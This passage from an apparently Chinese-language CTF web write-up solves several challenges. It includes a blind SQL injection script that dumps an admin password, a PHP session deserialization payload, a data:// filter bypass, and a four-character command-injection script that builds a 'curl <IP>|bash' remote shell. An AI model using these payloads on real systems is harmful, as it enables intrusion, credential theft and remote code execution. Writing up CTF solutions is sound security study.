class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid(CONCAT_WS(CHAR(32,58,32),user(),database(),version()),&#123;&#125;,1))&gt;&#123;&#125;)--+" #65</span></span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid((selselectect group_concat(column_NAME) frfromom information_schema.columnS where table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        payload=<span class="string">r"1' or 1=(ascii(mid((selselectect pwd frfromom admin limit 1),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid((database()),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        url_1=url+payload.format(i,mid)</span><br><span class="line">        data=&#123;<span class="string">"flag"</span>:payload.format(i,mid)&#125;</span><br><span class="line">        r=requests.post(url,data=data,cookies=Cookie,proxies=proxies)</span><br><span class="line">        print(r.content)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"is flag"</span> <span class="keyword">in</span>  r.content:</span><br><span class="line">            low=mid+<span class="number">1</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">    print(flag)</span><br><span class="line">    flag+=chr(mid)</span><br></pre></td></tr></table></figure><p>数据库里只有一半的flag：flag{Rogue-MySql-Server- ，同时还得到了admin用户的密码：whoamiadmin</p><p>根据前半段flag和登录后的提示，也就是伪造mysql服务任意文件读取的问题了，通过Rogue-MySql-Server脚本设置读取一下flag.php文件</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583751402598.png" alt>            </p><p>也就拿到了flag的后一部分，拼接起来就可以了。</p><h3 id="0x03-php-uaf"><a href="#0x03-php-uaf" class="headerlink" title="0x03 php uaf"></a>0x03 php uaf</h3><p>送分题，访问直接得源代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">@mkdir($sandbox);</span></span><br><span class="line"><span class="php">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure><p>看一下phpinfo，php版本是7.4.2，设置了disable_function和open_basedir</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309110411132.png" alt="image-20200309110411132"></p><p>直接拿<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> php7.4版本通杀的exp通道菜刀传上去直接执行/readflag就行了</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723134043.png" alt>            </p><h3 id="0x04-dooog"><a href="#0x04-dooog" class="headerlink" title="0x04 dooog"></a>0x04 dooog</h3><p>题目很简单，逻辑捋清楚就行了，从client出发，先后向kdc的getTGT和getTicket发包校验，校验通过则发包到cmd执行，执行没有回显，主要在getTicket中的判断限制了cmd的内容，不过认真分析一下kdc源码，可以发现data变量是可控的，控制前一数据包中的timestamp使得int(time.time()) - data[‘timestamp’] &gt; 60就可以了，所以修改client app.py</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, flash</span><br><span class="line">from flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line">from form <span class="keyword">import</span> RegisterForm, CmdForm</span><br><span class="line">from toolkit <span class="keyword">import</span> AESCipher</span><br><span class="line"><span class="keyword">import</span> os, requests, json, time, base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">"SECRET_KEY"</span>] = os.urandom(<span class="number">32</span>)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/cmd'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def cmd():</span><br><span class="line">    form = CmdForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            cmd = form.cmd.<span class="keyword">data</span></span><br><span class="line">            print(username,master_key,cmd)</span><br><span class="line">            cryptor = AESCipher(master_key)</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:username, <span class="string">'timestamp'</span>: int(time.time())&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'authenticator'</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            session[<span class="string">'session_key'</span>], session[<span class="string">'TGT'</span>] = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">'|'</span>)[<span class="number">0</span>])), res.content.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">            flash(<span class="string">'GET TGT DONE'</span>)</span><br><span class="line">            #visit TGS</span><br><span class="line">            cryptor = AESCipher(session[<span class="string">'session_key'</span>])</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: username, <span class="string">'timestamp'</span>: <span class="number">1</span>&#125;))</span><br><span class="line"></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>,  <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'cmd'</span>: cmd, <span class="string">'authenticator'</span>: base64.b64encode(authenticator), <span class="string">'TGT'</span>: session[<span class="string">'TGT'</span>]&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'cmd error'</span>:</span><br><span class="line">                flash(<span class="string">'cmd not allow'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            flash(<span class="string">'GET Ticket DONE'</span>)</span><br><span class="line">            client_message, server_message = res.content.split(<span class="string">'|'</span>)</span><br><span class="line">            session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">            cryptor = AESCipher(session_key)</span><br><span class="line">            authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>, <span class="keyword">data</span>=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>: authenticator&#125;)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>, flag=res.content)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/register'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def register():</span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/register'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'master_key'</span>: master_key&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'duplicate username'</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">            elif res.content != <span class="string">''</span> :</span><br><span class="line">                session[<span class="string">'id'</span>] = int(res.content)</span><br><span class="line">                flash(<span class="string">'register success'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=False, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>本地起一个服务来发包就行了</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723326867.png" alt>            </p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723345340.png" alt>            </p><h3 id="0x05-sqlcheckin"><a href="#0x05-sqlcheckin" class="headerlink" title="0x05 sqlcheckin"></a>0x05 sqlcheckin</h3><p>这道题原题，就不写了，转<a href="https://gksec.com/HNCTF2019-Final.html#toc-sqlsql" target="_blank" rel="noopener">https://gksec.com/HNCTF2019-Final.html#toc-sqlsql</a></p><h3 id="0x06-Hackme"><a href="#0x06-Hackme" class="headerlink" title="0x06 Hackme"></a>0x06 Hackme</h3><p>访问<a href="http://www.zip得到题目源码，主要在于profile.php" target="_blank" rel="noopener">www.zip得到题目源码，主要在于profile.php</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">session_save_path(<span class="string">'session'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $admin;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $sign;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="php">            redirect(<span class="string">'./core/index.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> info();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>构造一下序列化</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $admin;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $sign;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sign = <span class="string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="php">            redirect(<span class="string">'./core/index.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> info();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>输出：<code>O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:0:&quot;&quot;;}</code>修改为<code>|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:0:&quot;&quot;;}</code>发送后范围profile进入到/core/index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结起来就是4字节执行命令，不过首先得绕过一下preg_match，构造</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">url</span>=compress.zlib://data:@<span class="number">127.0</span>.<span class="number">0.1</span>/plain<span class="comment">;base64,xxxx</span></span><br></pre></td></tr></table></figure><p>来绕过判断，之后参考<a href="https://blog.csdn.net/qq_27446553/article/details/78502337" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/78502337</a> 四字符getshell构造脚本</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"># @Author: Cyc1e</span><br><span class="line"># @Date:   <span class="number">2020</span><span class="number">-03</span><span class="number">-09</span> <span class="number">13</span>:<span class="number">53</span>:<span class="number">34</span></span><br><span class="line"># @Last Modified by:   Cyc1e</span><br><span class="line"># @Last Modified time: <span class="number">2020</span><span class="number">-03</span><span class="number">-09</span> <span class="number">14</span>:<span class="number">18</span>:<span class="number">18</span></span><br><span class="line">#encoding=utf<span class="number">-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload = [</span><br><span class="line">    # 将 <span class="string">"g&gt; ht- sl"</span> 写到文件 <span class="string">"v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    # 将文件<span class="string">"v"</span>中的字符串倒序，放到文件<span class="string">"x"</span>，就变成了 <span class="string">"ls -th &gt;g"</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    # generate `curl orange.tw.tw|python`</span><br><span class="line">    # generate `curl <span class="number">10.188</span><span class="number">.2</span><span class="number">.20</span>|bash`</span><br><span class="line">    <span class="string">'&gt;p\ '</span>,</span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line">    <span class="string">'&gt;a.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;E1\\'</span>,</span><br><span class="line">    <span class="string">'&gt;01\\'</span>,</span><br><span class="line">    <span class="string">'&gt;E8\\'</span>,</span><br><span class="line">    <span class="string">'&gt;31\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0x\\'</span>,#IP地址的<span class="number">16</span>进制</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,# getshell</span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload_all = <span class="string">'compress.zlib://data:@127.0.0.1/plain;base64,&#123;0&#125;'</span></span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>: <span class="string">'d1b8d083fa8c9bdb28317c30b103bbb6'</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://121.36.222.22:88/core/clear.php'</span>,cookies=cookies)</span><br><span class="line">for i <span class="keyword">in</span> payload:</span><br><span class="line">    assert len(i) &lt;= <span class="number">20</span></span><br><span class="line">    r = requests.post(<span class="string">'http://121.36.222.22:88/core/index.php'</span>,cookies=cookies,data=&#123;<span class="string">"url"</span>:payload_all.format(base64.b64encode(i))&#125;)</span><br><span class="line">    print r.text</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309141741059.png" alt></p><h3 id="0x07-webct"><a href="#0x07-webct" class="headerlink" title="0x07 webct"></a>0x07 webct</h3><p>访问<a href="http://www.zip拿到题目源码，题目提供了两个页面，一个是测试数据库连接，一个是文件上传，分析一下源码" target="_blank" rel="noopener">www.zip拿到题目源码，题目提供了两个页面，一个是测试数据库连接，一个是文件上传，分析一下源码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#testsql.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$ip = $_POST[<span class="string">'ip'</span>];</span><br><span class="line">$user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$option = $_POST[<span class="string">'option'</span>];</span><br><span class="line">$m = <span class="keyword">new</span> db($ip,$user,$password,$option);</span><br><span class="line">$m-&gt;testquery();</span><br></pre></td></tr></table></figure><p>数据库连接测试接收到数据后实例化db类进行测试连接，文件上传页面源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//var_dump($_FILES["file"]);</span></span></span><br><span class="line"><span class="php">$file = <span class="keyword">new</span> File($_FILES[<span class="string">"file"</span>]);</span></span><br><span class="line"><span class="php">$fileupload = <span class="keyword">new</span> 